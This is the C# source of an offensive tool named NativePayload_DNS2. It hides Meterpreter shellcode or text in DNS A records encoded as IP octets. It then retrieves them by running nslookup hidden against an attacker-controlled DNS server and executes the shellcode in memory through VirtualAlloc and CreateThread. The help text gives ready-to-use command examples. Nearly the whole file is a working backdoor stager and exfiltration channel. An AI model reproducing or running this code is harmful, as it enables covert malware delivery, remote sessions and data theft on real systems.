using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace NativePayload_DNS2
{
    class Program
    {
                 
        static void Main(string[] args)
        {
           
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine();
            Console.WriteLine("NativePayload_DNS2 , Backdoor Payload Exfiltration by DNS Traffic (A Records)");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("Published by Damon Mohammadbagher Sep 2017");
            if (args[0].ToUpper() == "HELP")
            {
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine();
                Console.WriteLine("[!] NativePayload_DNS2 , Backdoor Payload Exfiltration by DNS Traffic (A Records)");
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("[!] Syntax 1: Creating Meterperter Payload for Transferring by DNS A records");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("[!] Syntax 1: NativePayload_DNS2.exe \"Create\" \"DomainName\" \"[Meterpreter Payload]\"  ");
                Console.WriteLine("[!] Example1: NativePayload_DNS2.exe Create MICROSOFT.COM \"fc,48,83,e4,f0,e8\"  ");
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("[!] Syntax 2: Getting Meterpeter SESSION via DNS A records");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("[!] Syntax 2: NativePayload_DNS2.exe \"Session\" \"DomainName\" FakeDNSServer  ");
                Console.WriteLine("[!] Example2: NativePayload_DNS2.exe Session MICROSOFT.COM 192.168.56.1  ");
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("[!] Syntax 3: Creating Text DATA for Transferring by DNS A records");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("[!] Syntax 3: NativePayload_DNS2.exe \"TextFile\" \"DomainName\" \"[Text Data]\"  ");
                Console.WriteLine("[!] Example3-1: NativePayload_DNS2.exe TextFile \"MICROSOFT.COM\" \"This is Test\"  ");
                Console.WriteLine("[!] Example3-2: NativePayload_DNS2.exe TextFile \"MICROSOFT.COM\" -f MytxtFile.txt  ");
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("[!] Syntax 4: Getting Text DATA via DNS A records");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("[!] Syntax 4: NativePayload_DNS2.exe \"Getdata\" \"DomainName\" FakeDNSServer  ");
                Console.WriteLine("[!] Example4: NativePayload_DNS2.exe Getdata \"MICROSOFT.COM\" 192.168.56.1  ");
                Console.ForegroundColor = ConsoleColor.Gray;
            }
            if (args[0].ToUpper() == "TEXTFILE")
            {

                string StartAddress = "0";
                string DomainName = args[1];
                string Payload = "";
                if (args[2].ToUpper() == "-F")
                {
                    Payload = System.IO.File.ReadAllText(args[3]);
                }
                else
                {
                    Payload = args[2];                    
                }
                string Temp_Hex = "";                
                int ChechkLength = Payload.Length % 3;
                

               if (Payload.Length > (3 * 255) || ChechkLength!=0)
                {
                    if (Payload.Length > (3 * 255))
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine();
                        Console.WriteLine("[x] WOow woOw Wait , Y is your payload counter in IPv4 Address X.X.X.Y");
                        Console.WriteLine("[x] So your Payload \"X.X.X\" for each A Records with same Domain Name should not have Length \"Y\" more than 255 ;)");
                        Console.WriteLine("[x] It means your Y * 3 should not more than 255 * 3 = 765 so your Payload Length should not more than 765 ;)");
                        Console.WriteLine("[x] Your payload length is {0}", Payload.Length.ToString());
                        Console.WriteLine("[x] Information : X.X.X.Y ==> 11.22.33.1 .... 11.22.33.255");
                        Console.WriteLine("[x] Information : in my code , 3 first octets are your payload and only last octet is your Counter for Payload Length");
                        Console.WriteLine("[x] Information : so you can not have Payload with more than 255 * 3 length ");
                        Console.ForegroundColor = ConsoleColor.Gray;
                    }
                    if(ChechkLength != 0)
                    {
                        Console.ForegroundColor = ConsoleColor.DarkYellow;
                        Console.WriteLine();
                        Console.WriteLine("[x] Your payload length % 3 should be 0");
                        Console.WriteLine("[x] Your payload length is {0}", Payload.Length.ToString());
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[x] Your payload length % 3 = {0}",ChechkLength.ToString());
                        Console.WriteLine("[x] For fixing you should Remove/Add one or two strings to your payload ;)");
                        Console.ForegroundColor = ConsoleColor.Gray;
                    }
                }
                else
                {
                    foreach (char P in Payload)
                    {
                        int tmp = P;
                        Temp_Hex += string.Format("{0:x2}", (Int32)Convert.ToInt32(tmp.ToString())) + ",";
                    }

                    SortIPAddress(Temp_Hex, StartAddress, DomainName);
                }
              
            }

            if (args[0].ToUpper() == "CREATE")
            {
                string StartAddress = "0";
                string DomainName = args[1];
                string Payload = args[2];
                int Checkit = (Payload.Split(',').Length) % 3;
                if (Checkit != 0)
                {
                    Console.ForegroundColor = ConsoleColor.DarkYellow;
                    Console.WriteLine();
                    Console.WriteLine("[x] Your payload length % 3 should be 0");
                    Console.WriteLine("[x] Your payload length is {0}", Payload.Split(',').Length.ToString());
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[x] Your payload length % 3 = {0}", Checkit.ToString());
                    if (Checkit == 2) Console.WriteLine("[x] For fixing you should Add \",00\" to your payload ;)");
                    if (Checkit == 1) Console.WriteLine("[x] For fixing you should Add \",00,00\" to your payload ;)");
                    Console.ForegroundColor = ConsoleColor.Gray;
                }
                else
                {
                    SortIPAddress(Payload, StartAddress, DomainName);
                }
            }
            if (args[0].ToUpper() == "SESSION")
            {

                byte[] _Exfiltration_DATA_Bytes_A_Records;
                _Exfiltration_DATA_Bytes_A_Records = __nslookup(args[1], args[2]);

                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine();
                Console.WriteLine("Bingo Meterpreter session by DNS traffic (A Records) ;)");
                UInt32 funcAddr = VirtualAlloc(0, (UInt32)_Exfiltration_DATA_Bytes_A_Records.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                Marshal.Copy(_Exfiltration_DATA_Bytes_A_Records, 0, (IntPtr)(funcAddr), _Exfiltration_DATA_Bytes_A_Records.Length);
                IntPtr hThread = IntPtr.Zero;
                UInt32 threadId = 0;
                IntPtr pinfo = IntPtr.Zero;

                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                WaitForSingleObject(hThread, 0xFFFFFFFF);

            }
            if (args[0].ToUpper() == "GETDATA")
            {
                byte[] _Exfiltration_DATA_Bytes_A_Records;
                _Exfiltration_DATA_Bytes_A_Records = __nslookup(args[1], args[2]);

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine();
                Console.Write("[>] Exfiltration Payload/Text Data is : ");
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.Write(UTF8Encoding.UTF8.GetChars(_Exfiltration_DATA_Bytes_A_Records));                
                Console.WriteLine();
            }   
           

        }
        public static string SortIPAddress(string _Payload,string MainIP, string String_DomainName)
        {
            string[] X = _Payload.Split(',');
            string[] XX = new string[X.Length / 3];
            int counter = 0;
            int X_counter = 0;
            string tmp = "";
            Console.WriteLine();
            for (int i = 0; i < X.Length;)
            {

                tmp += X[i]+",";
                i++;
                counter++;
                if (counter >= 3)
                {
                    counter = 0;
                    XX[X_counter] = tmp.Substring(0,tmp.Length-1);
                    X_counter++;
                    tmp = "";
                }
            }

            string[] IP_Octets = new string[3];
            string nique = "";
            string Final_DNS_Text_File = "";
            int Display_counter = 0;
            int First_Octet = 0;
            foreach (var item in XX)
            {
                /// First_Octet++; it means my counter for IPAddress will start by address W.X.Y.1 ...
                First_Octet++;
                IP_Octets = item.Split(',');
                if (Display_counter < 4)
                    Console.Write(item.ToString() + " ====>  ");
                foreach (string itemS in IP_Octets)
                {                    
                    int Tech = Int32.Parse(itemS, System.Globalization.NumberStyles.HexNumber);
                    nique += (Tech.ToString() + ".");
                }
                if (Display_counter < 4)
                    Console.WriteLine(nique.Substring(0, nique.Length - 1) + "." + (First_Octet + Int32.Parse(MainIP)).ToString());
                Final_DNS_Text_File += nique.Substring(0, nique.Length - 1) + "." + (First_Octet + Int32.Parse(MainIP)).ToString() + " " + String_DomainName + " \r\n";
                nique = "";
                Display_counter++;
            }
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("Copy these A Records to /etc/hosts or DNS.TXT for Using by Dnsmasq tool");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine(Final_DNS_Text_File);
            return "";
        }
        public static string _Records;
        public static byte[] __nslookup(string DNS_PTR_A, string DnsServer)
        {
            /// Make DNS traffic for getting Meterpreter Payloads by nslookup
            ProcessStartInfo ns_Prcs_info = new ProcessStartInfo("nslookup.exe", DNS_PTR_A + " " + DnsServer);
            ns_Prcs_info.RedirectStandardInput = true;
            ns_Prcs_info.RedirectStandardOutput = true;
            ns_Prcs_info.UseShellExecute = false;
            /// you can use Thread Sleep here 

            Process nslookup = new Process();
            nslookup.StartInfo = ns_Prcs_info;
            nslookup.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            nslookup.Start();

       
            string computerList = nslookup.StandardOutput.ReadToEnd();
           
            string[] lines = computerList.Split('\r', 'n');
            int ID = 0;
            foreach (var item in lines)
            {
                if (item.Contains(DNS_PTR_A))
                {
                    break;
                }
                ID++;
            }
            List<string> A_Records = new List<string>();
            try
            {

                int FindID_FirstAddress = ID + 1;
                string last_line = lines[lines.Length - 3];
              
                A_Records.Add(lines[FindID_FirstAddress].Split(':')[1].Substring(2));
                for (int iq = FindID_FirstAddress + 1; iq < lines.Length - 2; iq++)
                {
                    A_Records.Add(lines[iq].Substring(4));                   
                }
            }
            catch (Exception e1)
            {
                Console.WriteLine("error 1: {0}", e1.Message);
            }
            /// Debug
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.WriteLine("[!] Debug Mode [ON]");
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.WriteLine("[!] DNS Server Address: {0}", DnsServer);
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("[>] Downloading Meterpreter Payloads or Text Data by ({1}) DNS A Records for Domain Name : {0}", DNS_PTR_A, A_Records.Count.ToString());
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            foreach (var item3 in A_Records)
            {
                Console.Write("[{0}] , ",item3.ToString());
                
            }
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine();

            int serial = 0;
            string[] obj = new string[4];

            /// X.X.X * Y = Payload length; so A_Records * 3 is your Payload Length ;)
            byte[] XxXPayload = new byte[A_Records.Count * 3];

            Int32 Xnumber = 0;

            for (int Onaggi = 1; Onaggi <= A_Records.Count; Onaggi++)
            {

                foreach (var item in A_Records)
                {
                    obj = item.Split('.');
                    serial = Convert.ToInt32(item.Split('.')[3]);
                    if (serial == Onaggi)
                    {
                        XxXPayload[Xnumber] = Convert.ToByte(obj[0]);
                        XxXPayload[Xnumber + 1] = Convert.ToByte(obj[1]);
                        XxXPayload[Xnumber + 2] = Convert.ToByte(obj[2]);

                        Xnumber++;
                        Xnumber++;
                        Xnumber++;

                        break;
                    }
                }
            }
           
            return XxXPayload;

        }
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    }
}
